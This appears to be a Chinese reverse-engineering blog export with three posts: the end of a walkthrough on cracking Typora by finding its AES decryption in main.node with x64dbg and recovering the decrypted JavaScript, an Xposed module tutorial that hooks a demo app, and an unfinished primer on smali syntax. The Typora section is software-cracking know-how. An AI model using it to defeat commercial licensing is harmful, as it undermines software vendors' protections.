<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230904153908966.png" class title="image-20230904153908966">

<p>在观察代码的时候可以看到很多Node API函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">napi_get_named_property</span><br><span class="line">napi_get_global</span><br><span class="line">napi_get_named_property</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>可以看到这部分的函数调用和C语言实现AES算法结构相似，猜测为AES解密算法</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230904163100667.png" class title="image-20230904163100667">



<p>已知信息：</p>
<ul>
<li>main.node模块使用node api进行js函数调用</li>
<li>main.node模块使用AES解密算法</li>
</ul>
<p>根据已知信息进行如下分析：</p>
<ul>
<li>分析算法找到解密密钥以及判断模式，使用解密算法对其进行解密获取JS代码</li>
<li>分析程序执行流程，找到解密后的JS代码缓冲区获取解密后的JS代码</li>
</ul>
<h2 id="寻找JS代码"><a href="#寻找JS代码" class="headerlink" title="寻找JS代码"></a>寻找JS代码</h2><p>这里选用第二方法去寻找解密后的缓冲区代码</p>
<p>我们先来观察解密之前的JS函数napi_call_function()调用参数有两个</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230904164616626.png" class title="image-20230904164616626">

<p>我们来看下这个node api接口函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NAPI_EXTERN napi_status napi_call_function(napi_env env,            //环境</span><br><span class="line">                                           napi_value recv,         //名为global的值</span><br><span class="line">                                           napi_value func,            //要调用的javascript函数</span><br><span class="line">                                           size_t argc,                //JavaScript函数的参数个数  类似argc</span><br><span class="line">                                           const napi_value* argv,  //JavaScript函数的参数数组  类似argv</span><br><span class="line">                                           napi_value* result);     //返回的JavaScript对象</span><br></pre></td></tr></table></figure>



<p>接下来我们进行一波动态调试，使用x64dbg对main.node进行下断点动态调试</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230904170013223.png" class title="image-20230904170013223">

<p>点击调试后，断点跳转到如下点</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230904175038529.png" class title="image-20230904175038529">

<p>通过上面分析定位函数位置，同样为模块偏移为674A的位置</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230904175006656.png" class title="image-20230904175006656">

<p>下图为x64dbg的函数位置,并为其打上断点进行调试</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230905173236593.png" class title="image-20230905173236593">

<p>运行调试后可以看到该函数的参数以及对应的内存位置，这里可以看到函数参数为 rcx rdx r8 r9 rsp+0x20，超过四个则入栈</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230905174527944.png" class title="image-20230905174527944">

<p>如下图可以看到其调用的参数</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230906155808641.png" class title="image-20230906155808641">

<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230905174903375.png" class title="image-20230905174903375">



<p>接下来我们再来观察在调用JS代码后地址会有什么改变</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230906154736962.png" class title="image-20230906154736962">

<p>第五个参数为rsp+20，也就是rax的值，进入内存查看可以得到和前面同样的地址，也就是第一个参数</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230906160839943.png" class title="image-20230906160839943">



<p>下面继续分析AES解密代码部分，会将密文的缓冲区拿过来进行解密</p>
<p>首先进行一串16进制的赋值，v46的数组刚好32字节，也就是256bit，然后v32申请内存，调用sub_18000B060函数对v46和v32进行操作</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230906162540581.png" class title="image-20230906162540581">

<p>继续分析sub_180006AC0，反汇编得到伪代码</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230906163307985.png" class title="image-20230906163307985">

<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230906163350021.png" class title="image-20230906163350021">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall sub_180006AC0(v45,block,block_size)</span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">  if ( block_size )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = block;</span><br><span class="line">    v5 = v45 + 0xF0 - (_QWORD)block;           //v45+0xF0的地址  减去  block的地址得到v5</span><br><span class="line">    v6 = ((block_size - 1) &gt;&gt; 4) + 1;          //做为外圈循环的次数</span><br><span class="line">    do</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = *v3;             </span><br><span class="line">     //v7为 xmmword 16字节浮点寄存器 ，把block的内容取16字节给v7  16字节符合AES块大小 </span><br><span class="line">     //由此推测block是真正的密文，将在这个函数中进行解密操作</span><br><span class="line"> </span><br><span class="line">      sub_180007320(v3, v45);    //用到了AES解密常量  应该是解密相关  并且对推测的key  也就是前32字节有一些操作</span><br><span class="line">      v8 = 16i64;                //内圈循环16次</span><br><span class="line">      do</span><br><span class="line">      &#123;</span><br><span class="line">        result = *((char*)(v3 + v5));       //block地址 + v5偏移  取一个字节内容</span><br><span class="line">        *(char*)v3 ^= result;               //取block的1字节数据，与block地址 + v5偏移  进行异或</span><br><span class="line">        v3 = (__int128 *)((char *)v3 + 1);  //block += 1</span><br><span class="line">        --v8;                                //总共16次 也就是16个字节异或</span><br><span class="line">      &#125;</span><br><span class="line">      while ( v8 );</span><br><span class="line">      v5 -= 16i64;                          //外圈循环  v5 每次-16  也就是每次异或 异或的值都会变化 范围为-16字节</span><br><span class="line">      v45 + 0xF0 = v7;                        //block的16字节内容  给到v45+0xF0</span><br><span class="line">      --v6;                                    //外圈循环次数</span><br><span class="line">    &#125;</span><br><span class="line">    while ( v6 );</span><br><span class="line">  &#125;</span><br><span class="line">  return result;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以推测该函数为主要的解密算法函数，key存放在v45中，前32位也就是256位，iv存放在block+v5中</p>
<h2 id="获取JS代码"><a href="#获取JS代码" class="headerlink" title="获取JS代码"></a>获取JS代码</h2><p>根据前面的代码分析，只需要在彻底解密后在送到JS引擎执行的时候拿到该解密后的代码即可</p>
<p>根据上层函数调用，解密后返回一个值作为调用JS函数的参数</p>
<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230906164924324.png" class title="image-20230906164924324">

<img src="/2023/03/12/Typora%E7%A0%B4%E8%A7%A3%E4%B9%8B%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%8A%EF%BC%89/image-20230906163934026.png" class title="image-20230906163934026">
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>Windows</category>
        <category>案例分析</category>
      </categories>
      <tags>
        <tag>-typora -逆向分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Xposed模块编写</title>
    <url>/2023/03/12/Xposed%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<h1 id="Xposed模块编写"><a href="#Xposed模块编写" class="headerlink" title="Xposed模块编写"></a>Xposed模块编写</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Xpose模块原理是部署在ROOT后的安卓手机上，通过替换&#x2F;system&#x2F;bin&#x2F;app_process程序来控制zygote进程，使得app_process在启动过程中加载XposedBridge.jar包，从而对zygote进程以及其创建的Dalvik虚拟机的劫持。可以使得在不修改apk源码的情况下，通过自己编写的模块来影响程序运行的框架服务，例如自动抢红包、微信消息自动回复等功能</p>
<p>Xposed模块与其他Android程序不同的区别如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.让手机的xposed框架知道该程序为xposed模块</span><br><span class="line">2.xposed模块需要包含由xposed的api的jar包，以实现hook操作</span><br><span class="line">3.该模块中需要有对目标程序进行Hook操作的方法</span><br><span class="line">4.手机上的xposed框架知道该xposed模块中的哪一个方法实现H</span><br></pre></td></tr></table></figure>

<p>需要准备的工具如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、androidManifest.xml</span><br><span class="line">2、XposedBridgeApi-xx.jar和build.gradle</span><br><span class="line">3、实现hook操作的具体代码</span><br><span class="line">4、xposed_init</span><br></pre></td></tr></table></figure>

<h2 id="编写AndroidManifest-xml"><a href="#编写AndroidManifest-xml" class="headerlink" title="编写AndroidManifest.xml"></a>编写AndroidManifest.xml</h2><p>新建项目并将其设置为Project模式，然后将AndroidManifest.xml修改添加xposed模块信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line"></span><br><span class="line">android:name=&quot;xposedmodule&quot;</span><br><span class="line"></span><br><span class="line">android:value=&quot;true&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta-data</span><br><span class="line"></span><br><span class="line">    android:name=&quot;xposeddescription&quot;</span><br><span class="line"></span><br><span class="line">    android:value=&quot;这是一个Xposed demo&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta-data</span><br><span class="line"></span><br><span class="line">    android:name=&quot;xposedminversion&quot;</span><br><span class="line"></span><br><span class="line">    android:value=&quot;89&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>添加如下所示</p>
<img src="/2023/03/12/Xposed%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99/image-20230802181823166.png" class title="image-20230802181823166">

<p>运行该项目后在xpose模块中可以看到该模块，说明xposed框架已认出我们写的程序。</p>
<img src="/2023/03/12/Xposed%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99/image-20230802182101875.png" class title="image-20230802182101875">



<h2 id="引入XposedBridgeApi-jar"><a href="#引入XposedBridgeApi-jar" class="headerlink" title="引入XposedBridgeApi.jar"></a>引入XposedBridgeApi.jar</h2><p>xposed模块主要是用来hook其他程序的各种程序，该包就是使得模块具有该模块具有这本事。</p>
<p>下载对应xposed版本的xposedapi-xx.jar包放入项目的app&#x2F;libs文件夹下，然后右键”Add As Library”自行添加jar包</p>
<img src="/2023/03/12/Xposed%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99/image-20230802190031415.png" class title="image-20230802190031415">



<h2 id="实现hook操作"><a href="#实现hook操作" class="headerlink" title="实现hook操作"></a>实现hook操作</h2><p>我们先编写个简单的hook代码，在日志中记录下加载app的名字，在logcat中输出，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.example.myapplication;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line">import de.robv.android.xposed.XposedBridge;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line">public class HookDemo implements IXposedHookLoadPackage &#123;</span><br><span class="line">    public void handleLoadPackage(LoadPackageParam lpparam) throws Throwable &#123;</span><br><span class="line"></span><br><span class="line">        XposedBridge.log(&quot;Loaded app: &quot; + lpparam.packageName);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="添加入口点"><a href="#添加入口点" class="headerlink" title="添加入口点"></a>添加入口点</h2><p>添加入口点是告诉XposedBridge的hook入口在哪里，在app&#x2F;src&#x2F;main文件夹下创建assets文件夹，在其下创建文件xposed_init，该文件每行包含一个class的全限定名</p>
<img src="/2023/03/12/Xposed%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99/image-20230802230556482.png" class title="image-20230802230556482">



<p>重启手机使得模块生效，可以在日志中看到我们自定义的字符串信息</p>
<img src="/2023/03/12/Xposed%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99/image-20230802231754369.png" class title="image-20230802231754369">



<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>修改MainActivity代码，生成个按钮点击显示”这是一条信息？”字符串，MainActivity.java程序如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.myapplication;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.annotation.SuppressLint;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.Toast;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Button button;</span><br><span class="line">    <span class="meta">@SuppressLint(&quot;MissingInflatedId&quot;)</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.layout);</span><br><span class="line">        button = (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, toastMessage(), Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toastMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;这是一条信息？&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>设置该程序的页面设计效果，在&#x2F;app&#x2F;src&#x2F;res文件夹下新建layout文件夹，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</span><br><span class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout_height=&quot;match_parent&quot;</span><br><span class="line">    tools:context=&quot;.MainActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;TextView</span><br><span class="line">        android:id=&quot;@+id/textView&quot;</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:text=&quot;Hello World!&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf=&quot;parent&quot;</span><br><span class="line">        app:layout_constraintLeft_toLeftOf=&quot;parent&quot;</span><br><span class="line">        app:layout_constraintRight_toRightOf=&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;Button</span><br><span class="line">        android:id=&quot;@+id/button&quot;</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_marginEnd=&quot;1dp&quot;</span><br><span class="line">        android:layout_marginBottom=&quot;90dp&quot;</span><br><span class="line">        android:text=&quot;Button&quot;</span><br><span class="line">        app:layout_constraintBottom_toTopOf=&quot;@+id/textView&quot;</span><br><span class="line">        app:layout_constraintEnd_toEndOf=&quot;@+id/textView&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/androidx.constraintlayout.widget.ConstraintLayout&gt;</span><br></pre></td></tr></table></figure>

<p>程序运行后效果如下</p>
<img src="/2023/03/12/Xposed%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99/image-20230803215703234.png" class title="image-20230803215703234">



<p>接下来我们编写xposed模块，实现对这个弹窗内容的修改，在MainActivity.java同目录下新建HookDemo类，来实现toastMessage函数的返回值，代码如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">mport de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HookDemo</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (loadPackageParam.packageName.equals(<span class="string">&quot;com.example.myapplication&quot;</span>)) &#123;</span><br><span class="line">            Class clazz;</span><br><span class="line">            clazz = loadPackageParam.classLoader.loadClass(</span><br><span class="line">                    <span class="string">&quot;com.example.myapplication.MainActivity&quot;</span>);</span><br><span class="line">            XposedHelpers.findAndHookMethod(clazz, <span class="string">&quot;toastMessage&quot;</span>, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                    param.setResult(<span class="string">&quot;你已被劫持&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>由代码可知，我们是通过IXposedHookLoadPackage接口中的handleLoadPackage方法来实现Hook并篡改程序的输出结果的。代码中“com.example.myapplication ”是目标程序的包名，”com.example.myapplication.MainActivity” 是想要Hook的类， “toastMessage”是想要Hook的方法。我们在afterHookedMethod方法（用来定义Hook了目标方法之后的操作）中，修改了toastMessage()方法的返回值为“你已被劫持”。</p>
<p>接下来添加xposed入口点，在main文件夹下新建assets文件夹，且在其下新建txt文档xposed_init，每行代表一个Hook类</p>
<img src="/2023/03/12/Xposed%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99/image-20230804142421557.png" class title="image-20230804142421557">

<p>将其安装到手机中，在xposed框架上找到并打上勾，重启后观察是否弹窗提示信息已经变了</p>
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>Android</category>
        <category>基础知识</category>
      </categories>
      <tags>
        <tag>-Xposed -hook</tag>
      </tags>
  </entry>
  <entry>
    <title>smali文件简解</title>
    <url>/2023/03/12/smali%E6%96%87%E4%BB%B6%E7%AE%80%E8%A7%A3/</url>
    <content><![CDATA[<h1 id="smali文件简解"><a href="#smali文件简解" class="headerlink" title="smali文件简解"></a>smali文件简解</h1><p>通过反编译.dex文件出来的.smali文件都对应java中的一个类，每个smali文件都是由Davilk指令组成的，通常以”.”开头。</p>
<p>常用指令如下：</p>
<img src="/2023/03/12/smali%E6%96%87%E4%BB%B6%E7%AE%80%E8%A7%A3/image-20230703202341279.png" class title="image-20230703202341279">

<h2 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h2><p>文件前三行描述当前类的信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.class &lt;访问权限修饰符&gt; [非权限修饰符] &lt;类名&gt;</span><br><span class="line">.super &lt;父类名&gt;</span><br><span class="line">.source &lt;源文件名称&gt;</span><br></pre></td></tr></table></figure>

<p>访问权限修饰符即所谓的public,protected,private即default.而非权限修饰符则指的是final,abstract.</p>
<h2 id="文件正文"><a href="#文件正文" class="headerlink" title="文件正文"></a>文件正文</h2><p>在文件头之后便是文件的正文,即类的主体部分,包括类实现的接口描述,注解描述,字段描述和方法描述四部分.</p>
<h3 id="接口描述"><a href="#接口描述" class="headerlink" title="接口描述"></a>接口描述</h3><p>该类实现某个接口，通过.implements定义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#interfaces</span><br><span class="line">.implements &lt;接口名称&gt;;   </span><br></pre></td></tr></table></figure>

<h3 id="注解描述"><a href="#注解描述" class="headerlink" title="注解描述"></a>注解描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#annotations</span><br><span class="line">.annotation [注解的属性] &lt;注解类名&gt;</span><br><span class="line">    [注解字段=值]</span><br><span class="line">    ...</span><br><span class="line">.end</span><br></pre></td></tr></table></figure>

<h3 id="字段描述"><a href="#字段描述" class="headerlink" title="字段描述"></a>字段描述</h3><p>使用.field描述字段，分为静态字段(类属性)和普通字段(实例属性)</p>
<p><strong>普通字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#instance fields</span><br><span class="line">.field &lt;访问权限修饰符&gt; [非权限修饰符] &lt;字段名&gt;:&lt;字段类型&gt;</span><br></pre></td></tr></table></figure>

<p><strong>静态字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#static fields</span><br><span class="line">.field &lt;访问权限&gt; static [修饰词] &lt;字段名&gt;:&lt;字段类型&gt;</span><br></pre></td></tr></table></figure>

<h3 id="方法描述"><a href="#方法描述" class="headerlink" title="方法描述"></a>方法描述</h3><p>使用.method描述方法，分为直接方法，虚方法</p>
<h4 id="直接方法"><a href="#直接方法" class="headerlink" title="直接方法"></a>直接方法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#direct methods</span><br><span class="line">.method &lt;访问权限修饰符&gt; [非访问权限修饰符] &lt;方法原型&gt;</span><br><span class="line">      &lt;.locals&gt;</span><br><span class="line">      [.parameter]</span><br><span class="line">      [.prologue]</span><br><span class="line">      [.line]</span><br><span class="line">      &lt;代码逻辑&gt;</span><br><span class="line">.end</span><br></pre></td></tr></table></figure>

<p>在smali中,方法的默认对象参数用p0表示。parameter的个数和方法参数的数量相对应,即有几个参数便有几个<code>.parameter</code>,默认从1开始,即p1,p2,p2…</p>
<p><strong>举例说明</strong></p>
<pre><code>#direct methods
.method public constructor &lt;init&gt;()V
.registers 2

.prologue
.line 8
invoke-direct &#123;p0&#125;, Landroid/app/Activity;-&gt;&lt;init&gt;()V

.line 10
const-string v0, &quot;MainActivity&quot;

iput-object v0, p0, Lcom/social_touch/demo/MainActivity;-&gt;TAG:Ljava/lang/String;

.line 13
const/4 v0, 0x0

iput-boolean v0, p0, Lcom/social_touch/demo/MainActivity;-&gt;running:Z

return-void
.end method
</code></pre>
<h4 id="虚方法"><a href="#虚方法" class="headerlink" title="虚方法"></a>虚方法</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#virtual methods</span><br><span class="line">.method &lt;访问权限&gt; [修饰关键词] &lt;方法原想&gt;</span><br><span class="line">      &lt;.locals&gt;</span><br><span class="line">      [.parameter1]</span><br><span class="line">      [.parameter2]</span><br><span class="line">      [.prologue]</span><br><span class="line">      [.line]</span><br><span class="line">      &lt;代码逻辑&gt;</span><br><span class="line">.end</span><br></pre></td></tr></table></figure>

<h3 id="实例演示"><a href="#实例演示" class="headerlink" title="实例演示"></a>实例演示</h3><p>我们先来看一段java代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">Activity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String TAG = <span class="string">&quot;MainActivity&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">float</span> pi = (<span class="keyword">float</span>) <span class="number">3.14</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> running = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result = add(<span class="number">4</span>, <span class="number">5</span>);</span><br><span class="line">        System.out.println(result);</span><br><span class="line"></span><br><span class="line">        result = sub(<span class="number">9</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result &gt; <span class="number">4</span>) &#123;</span><br><span class="line">            log(result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">sub</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> x + y;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">log</span><span class="params">(<span class="keyword">int</span> result)</span> </span>&#123;</span><br><span class="line">        Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;the result:&quot;</span> + result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面来看下上述代码反编译后得到的smali代码</p>
